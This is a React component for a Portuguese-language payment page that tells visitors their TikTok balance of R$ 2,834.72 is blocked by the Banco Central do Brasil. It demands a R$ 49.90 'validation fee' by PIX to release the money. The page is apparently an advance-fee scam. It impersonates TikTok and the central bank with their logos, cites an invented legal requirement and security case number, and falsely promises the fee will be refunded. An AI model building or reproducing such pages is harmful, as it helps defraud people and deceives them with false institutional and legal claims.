import { useEffect } from 'react';
import PageTransition from '@/components/PageTransition';
import { trackViewContent } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_FINAL = 2834.72;
const TAXA_TVS = 49.90;
const TAXA_TVS_CENTAVOS = 4990;
const PRODUCT_HASH = 'prod_a97b4b7f478517d4';

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up3 = () => {
  useEffect(() => {
    trackViewContent('Taxa de Validação TVS', TAXA_TVS);
  }, []);

  return (
    <PageTransition>
      <main className="upsell-page upsell-page-with-footer">
        {/* Header */}
        <div className="upsell-header">
          <img src="/images/tiktok-logo.png" alt="TikTok" className="upsell-logo" />
        </div>

        {/* Saldo Retido Card */}
        <div className="upsell-card upsell-card-center">
          <p className="saldo-label-small">SALDO RETIDO</p>
          <h1 className="saldo-big">R$ {formatBR(SALDO_FINAL)}</h1>
          <div className="status-badge status-warning">
            ⚠ Pendência de Segurança nº 9082-BC
          </div>
        </div>

        {/* Motivo do Bloqueio */}
        <div className="upsell-card">
          <div className="alert-box alert-warning">
            <p className="alert-title">⚠ MOTIVO DO BLOQUEIO:</p>
            <p className="alert-text">
              O sistema anti-fraude do Banco Central identificou uma movimentação atípica. Conforme a Lei 14.220, transferências acima de 2k exigem Validação Biométrica Financeira.
            </p>
          </div>

          <p className="section-label">RESUMO</p>

          <div className="summary-row summary-row-border">
            <span className="summary-label">Status</span>
            <span className="summary-value summary-value-orange">Pausado</span>
          </div>

          <div className="summary-row summary-row-bg">
            <span className="summary-label-bold">Taxa de Validação (TVS)</span>
            <span className="summary-value-big">R$ {formatBR(TAXA_TVS)}</span>
          </div>

          <div className="success-box">
            <span className="success-icon">✓</span>
            <p className="success-text">
              O valor da taxa serve apenas para confirmar titularidade e será devolvido junto com o saque.
            </p>
          </div>

          <div className="logo-row">
            <img src="/images/bacen.png" alt="Banco Central do Brasil" className="partner-logo" />
          </div>
        </div>

        {/* Fixed Bottom Button */}
        <div className="fixed-footer">
          <button
            className="paradise-upsell-btn"
            style={{
              backgroundColor: '#28a745',
              color: '#ffffff',
              padding: '12px 20px',
              border: 'none',
              borderRadius: '6px',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: 'pointer',
              width: '100%',
            }}
            data-offer-hash="upsell_1201f24d72a2ed73"
            data-modal-title="Liberar Saldo"
            data-copy-button-text="Copiar Código PIX"
            data-modal-bg="#ffffff"
            data-modal-title-color="#1f2937"
            data-modal-btn-color="#28a745"
            data-modal-btn-text-color="#ffffff"
          >
            Liberar saldo
          </button>
          <p className="cta-success-note">Reembolso Automático</p>
        </div>
      </main>
    </PageTransition>
  );
};

export default Up3;
